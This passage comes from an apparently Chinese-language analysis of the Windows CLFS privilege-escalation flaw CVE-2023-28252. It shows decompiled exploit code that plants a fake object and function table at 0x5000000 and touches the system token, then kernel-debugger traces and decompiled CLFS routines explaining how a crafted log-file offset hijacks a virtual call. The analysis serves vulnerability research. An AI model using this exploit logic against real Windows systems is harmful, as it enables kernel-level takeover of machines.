MEMORY[<span style="color:#ae81ff">0x5001028</span>]<span style="color:#f92672">=</span> RtlClearBitKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000008</span>]<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">+</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateLogFile</span>(<span style="color:#f92672">::</span>pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> v65<span style="color:#f92672">=</span> system_TOKEN;</span></span><span style="display:flex;"><span> system_token_object<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v66<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">size_t</span><span style="color:#f92672">*</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">__int64</span>,<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>))(addr_array<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>);</span></span><span style="display:flex;"><span> v67<span style="color:#f92672">=</span><span style="color:#a6e22e">sub_7FF662E78B70</span>();</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v66</span>(v67,<span style="color:#f92672">&amp;</span>system_token_object, v65,<span style="color:#ae81ff">8</span>i64, v88);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( system_token_object<span style="color:#f92672">>=</span><span style="color:#ae81ff">0x8181818181818181u</span>i64 )</span></span></code></pre></div><p>根据调用栈，再除去布局的函数之外，最后调用的是CLFS!CClfsBaseFilePersisted::CheckSecureAccess+0x174</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>fffff800`531337d4 488bf9 mov rdi, rcx</span></span><span style="display:flex;"><span>fffff800`531337d7 48894c2450 mov qword ptr [rsp+50h], rcx</span></span><span style="display:flex;"><span>fffff800`531337dc 488b01 mov rax, qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800`531337df 488b00 mov rax, qword ptr [rax]</span></span><span style="display:flex;"><span>**fffff800`531337e2 ff15001effff call qword ptr [CLFS!__guard_dispatch_icall_fptr (fffff800531255e8)]**</span></span><span style="display:flex;"><span>fffff800`531337e8 4c8d4c2448 lea r9, [rsp+48h]</span></span></code></pre></div><p><img src="../../../images/vulnerability/Windows-CLFS-EoP/4.png" alt="" path="vulnerability/Windows-CLFS-EoP/" if="vulnerability/Windows-CLFS-EoP/CVE-2023-28252.zh-cn.md"/></p><p>同时调试器中可以看到rcx指向的对象位于0x5000000，同时对象内的函数指针指向了ClfsEarlierLsn，和调试过程中的一致。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> rrcx</span></span><span style="display:flex;"><span>rcx=0000000005000000</span></span><span style="display:flex;"><span>0: kd> dq rcx</span></span><span style="display:flex;"><span>00000000`05000000 00000000`05001000 ffffa289`14aec2b2</span></span><span style="display:flex;"><span>00000000`05000010 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000020 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000030 ffffa289`17764520 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000040 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000050 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000060 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000070 00000000`00000000 00000000`00000000</span></span><span style="display:flex;"><span>0: kd> dq 00000000`05001000</span></span><span style="display:flex;"><span>00000000`05001000 fffff800`53141b60 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001010 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001020 fffff800`53112b20 fffff800`55c2c640</span></span><span style="display:flex;"><span>00000000`05001030 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001040 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001050 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001060 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001070 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>0: kd> u fffff800`53112b20</span></span><span style="display:flex;"><span>CLFS!ClfsEarlierLsn:</span></span><span style="display:flex;"><span>fffff800`53112b20 488b0511280000 mov rax,qword ptr [CLFS!CLFS_LSN_INVALID (fffff800`53115338)]</span></span><span style="display:flex;"><span>fffff800`53112b27 4885c9 test rcx,rcx</span></span><span style="display:flex;"><span>fffff800`53112b2a 7436 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span><span style="display:flex;"><span>fffff800`53112b2c 488b09 mov rcx,qword ptr [rcx]</span></span><span style="display:flex;"><span>fffff800`53112b2f 483b0d8a230000 cmp rcx,qword ptr [CLFS!CLFS_LSN_NULL (fffff800`53114ec0)]</span></span><span style="display:flex;"><span>fffff800`53112b36 742a je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span><span style="display:flex;"><span>fffff800`53112b38 483bc8 cmp rcx,rax</span></span><span style="display:flex;"><span>fffff800`53112b3b 7425 je CLFS!ClfsEarlierLsn+0x42 (fffff800`53112b62)</span></span></code></pre></div><p>根据CClfsBaseFilePersisted::CheckSecureAccess的伪代码，可知触发漏洞的错误对象来自于CClfsBaseFile::GetSymbol，并且其类型为_CLFS_CONTAINER_CONTEXT 对象指针。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(a1, v14, v12,<span style="color:#f92672">&amp;</span>v25);<span style="color:#75715e">// 获取到错误对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v17<span style="color:#f92672">=</span> Symbol;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( Symbol<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_21;</span></span><span style="display:flex;"><span> v15<span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">***</span>)(_QWORD))<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v25<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v15 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v20<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> CClfsContainer<span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>((_QWORD<span style="color:#f92672">*</span>)v25<span style="color:#f92672">+</span><span style="color:#ae81ff">3</span>);<span style="color:#75715e">// 调用函数指针</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v7<span style="color:#f92672">=</span> v20;</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(</span></span><span style="display:flex;"><span> PERESOURCE<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">**</span>a4)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> .....</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a2<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x1368</span> )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">3222929421</span>i64;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a4<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ExAcquireResourceSharedLite</span>(this[<span style="color:#ae81ff">4</span>],<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">IsValidOffset</span>((CClfsBaseFile<span style="color:#f92672">*</span>)this, v6<span style="color:#f92672">+</span><span style="color:#ae81ff">47</span>) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>((CClfsBaseFile<span style="color:#f92672">*</span>)this);</span></span><span style="display:flex;"><span> v18[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongAdd</span>(v6,<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v11<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>), (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)v18)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">!</span>v12</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> v18[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">>=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span>)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">!</span>(v12<span style="color:#f92672">+</span> v6) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v12<span style="color:#f92672">+</span> v6<span style="color:#f92672">-</span><span style="color:#ae81ff">12</span>)<span style="color:#f92672">!=</span> (_DWORD)v6 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1073741816</span>;</span></span><span style="display:flex;"><span>LABEL_16:</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span> v8;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_17;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span><span style="color:#a6e22e">ClfsQuadAlign</span>(<span style="color:#ae81ff">0x30u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v15<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">!=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(v16<span style="color:#f92672">+</span> v14)</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)v15<span style="color:#f92672">!=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1040322552</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v15<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">!=</span><span style="color:#ae81ff">48</span></span></span><span style="display:flex;"><span><span style="color:#f92672">||</span><span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v15<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">!=</span> a3 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_15:</span></span><span style="display:flex;"><span> v8<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_16;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>a4<span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> _CLFS_CONTAINER_CONTEXT<span style="color:#f92672">*</span>)v15;</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v8;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C00346FE<span style="color:#ae81ff">8</span>B FA mov edi, edx</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034766 E8 B5<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> call<span style="color:#f92672">?</span>GetBaseLogRecord<span style="color:#960050;background-color:#1e0010">@</span>CClfsBaseFile<span style="color:#960050;background-color:#1e0010">@@</span>IEAAPEAU_CLFS_BASE_RECORD_HEADER<span style="color:#960050;background-color:#1e0010">@@</span>XZ ; CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>(<span style="color:#66d9ef">void</span>)</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034766</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003476B ;<span style="color:#ae81ff">28</span><span style="color:#f92672">:</span> v18[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003476B<span style="color:#ae81ff">4</span>C<span style="color:#ae81ff">8</span>B C8 mov r9, rax</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003476E<span style="color:#ae81ff">89</span><span style="color:#ae81ff">5</span>C<span style="color:#ae81ff">24</span><span style="color:#ae81ff">24</span> mov [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h<span style="color:#f92672">+</span>var_24], ebx</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772 ;<span style="color:#ae81ff">29</span><span style="color:#f92672">:</span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ULongAdd</span>(v6,<span style="color:#f92672">*</span>(_DWORD<span style="color:#f92672">*</span>)(v11<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>), (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)v18)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span></span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772 ;<span style="color:#ae81ff">30</span><span style="color:#f92672">:</span><span style="color:#f92672">||</span><span style="color:#f92672">!</span>v12</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772 ;<span style="color:#ae81ff">31</span><span style="color:#f92672">:</span><span style="color:#f92672">||</span> v18[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">>=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>)(v13<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">9</span>)</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772 ;<span style="color:#ae81ff">32</span><span style="color:#f92672">:</span><span style="color:#f92672">||</span><span style="color:#f92672">!</span>(v12<span style="color:#f92672">+</span> v6) )</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034772<span style="color:#ae81ff">4</span>C<span style="color:#ae81ff">8</span>D<span style="color:#ae81ff">44</span><span style="color:#ae81ff">24</span><span style="color:#ae81ff">24</span> lea r8, [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h<span style="color:#f92672">+</span>var_24]</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034777<span style="color:#ae81ff">41</span><span style="color:#ae81ff">8</span>B<span style="color:#ae81ff">53</span><span style="color:#ae81ff">28</span> mov edx, [r11<span style="color:#f92672">+</span><span style="color:#ae81ff">28</span>h]</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003477B<span style="color:#ae81ff">8</span>B CF mov ecx, edi</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003477D E8<span style="color:#ae81ff">1</span>E<span style="color:#ae81ff">7</span>D FD FF call<span style="color:#f92672">?</span>ULongAdd<span style="color:#960050;background-color:#1e0010">@@</span>YAJKKPEAK<span style="color:#960050;background-color:#1e0010">@</span>Z ;<span style="color:#a6e22e">ULongAdd</span>(ulong,ulong,ulong<span style="color:#f92672">*</span>)</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003477D</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034782<span style="color:#ae81ff">85</span> C0 test eax, eax</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034784<span style="color:#ae81ff">78</span><span style="color:#ae81ff">5</span>B js<span style="color:#66d9ef">short</span> loc_1C00347E1</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034784</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034786<span style="color:#ae81ff">4</span>D<span style="color:#ae81ff">85</span> C9 test r9, r9</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034789<span style="color:#ae81ff">74</span><span style="color:#ae81ff">56</span> jz<span style="color:#66d9ef">short</span> loc_1C00347E1</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034789</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003478B<span style="color:#ae81ff">41</span><span style="color:#ae81ff">0F</span> B7<span style="color:#ae81ff">43</span><span style="color:#ae81ff">04</span> movzx eax, word ptr [r11<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>]</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034790 C1 E0<span style="color:#ae81ff">09</span> shl eax,<span style="color:#ae81ff">9</span></span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034793<span style="color:#ae81ff">39</span><span style="color:#ae81ff">44</span><span style="color:#ae81ff">24</span><span style="color:#ae81ff">24</span> cmp [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>h<span style="color:#f92672">+</span>var_24], eax</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034797<span style="color:#ae81ff">73</span><span style="color:#ae81ff">48</span> jnb<span style="color:#66d9ef">short</span> loc_1C00347E1</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034797</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034799 ;<span style="color:#ae81ff">34</span><span style="color:#f92672">:</span><span style="color:#66d9ef">goto</span> LABEL_15;</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C0034799<span style="color:#ae81ff">48</span><span style="color:#ae81ff">8</span>B D7 mov rdx, rdi</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C003479C<span style="color:#ae81ff">49</span><span style="color:#ae81ff">03</span> D1 add rdx, r9</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span>PAGE:<span style="color:#ae81ff">00000001</span>C00347DC<span style="color:#ae81ff">49</span><span style="color:#ae81ff">89</span><span style="color:#ae81ff">16</span> mov [r14], rdx</span></span></code></pre></div><p>根据伪代码和汇编可知最终a4的值由rdx+r9，r9来自于GetBaseLogRecord函数返回值，是一个固定值，rdx是CClfsBaseFile::GetSymbol的第二个参数，需要注意的是要将值赋给a4需要满足if语句中的条件，可以看到对应于在主blf文件修改的几个值。</p><p>在CClfsBaseFilePersisted::CheckSecureAccess中，GetSymbol的第二个参数为BaseLogRecord+0x328，对应于rgContainers数组。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BaseLogRecord<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetBaseLogRecord</span>((CClfsBaseFile<span style="color:#f92672">*</span>)a1);</span></span><span style="display:flex;"><span> v26<span style="color:#f92672">=</span> BaseLogRecord;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>BaseLogRecord )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span>LABEL_20:</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span> v17<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1072037875</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">goto</span> LABEL_21;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span> v24<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v23<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v13<span style="color:#f92672">&lt;</span> v11<span style="color:#f92672">&amp;&amp;</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v12<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x400</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v14<span style="color:#f92672">=</span><span style="color:#f92672">*</span>((_DWORD<span style="color:#f92672">*</span>)BaseLogRecord<span style="color:#f92672">+</span> v12<span style="color:#f92672">+</span><span style="color:#ae81ff">0xCA</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v14 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> Symbol<span style="color:#f92672">=</span> CClfsBaseFile<span style="color:#f92672">::</span><span style="color:#a6e22e">GetSymbol</span>(a1, v14, v12,<span style="color:#f92672">&amp;</span>v25);<span style="color:#75715e">// 获取到错误对象</span></span></span></code></pre></div><p>在内存中可以看到其值为0x1570</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> db ffffe381<span style="color:#960050;background-color:#1e0010">`</span>a86d7070<span style="color:#f92672">+</span><span style="color:#ae81ff">0x328</span></span></span><span style="display:flex;"><span>ffffe381<span style="color:#960050;background-color:#1e0010">`</span>a86d7398<span style="color:#ae81ff">70</span><span style="color:#ae81ff">15</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> p...............</span></span><span style="display:flex;"><span>ffffe381<span style="color:#960050;background-color:#1e0010">`</span>a86d73a8<span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">00</span> ................</span></span></code></pre></div><p>根据代码逻辑GetSymbol会根据BaseLogRecord+0x1570定位container context对象并尝试调用pContainer成员的指针，container context如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0: kd> dq ffffe381`a86d7070 + 0x1570</span></span><span style="display:flex;"><span>ffffe381`a86d85e0 00000030`c1fdf008 00000000`00000000</span></span><span style="display:flex;"><span>ffffe381`a86d85f0 00000000`00000000 00000000`05000000</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>0: kd> dps 00000000`05000000</span></span><span style="display:flex;"><span>00000000`05000000 00000000`05001000</span></span><span style="display:flex;"><span>00000000`05000008 ffffa289`14aec2b2</span></span><span style="display:flex;"><span>00000000`05000010 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000018 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000020 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000028 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000030 ffffa289`17764520</span></span><span style="display:flex;"><span>00000000`05000038 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000040 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000048 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000050 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000058 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000060 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000068 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000070 00000000`00000000</span></span><span style="display:flex;"><span>00000000`05000078 00000000`00000000</span></span><span style="display:flex;"><span>0: kd> dq 00000000`05001000</span></span><span style="display:flex;"><span>00000000`05001000 fffff800`53141b60 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001010 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001020 fffff800`53112b20 fffff800`55c2c640</span></span><span style="display:flex;"><span>00000000`05001030 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001040 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001050 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001060 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>00000000`05001070 fffff800`53112b20 fffff800`53112b20</span></span><span style="display:flex;"><span>0: kd> u fffff800`53141b60</span></span><span style="display:flex;"><span>CLFS!ClfsMgmtDeregisterManagedClient:</span></span><span style="display:flex;"><span>fffff800`53141b60 48895c2408 mov qword ptr [rsp+8],rbx</span></span><span style="display:flex;"><span>fffff800`53141b65 57 push rdi</span></span><span style="display:flex;"><span>fffff800`53141b66 4883ec20 sub rsp,20h</span></span><span style="display:flex;"><span>fffff800`53141b6a 488bd9 mov rbx,rcx</span></span><span style="display:flex;"><span>fffff800`53141b6d 4885c9 test rcx,rcx</span></span><span 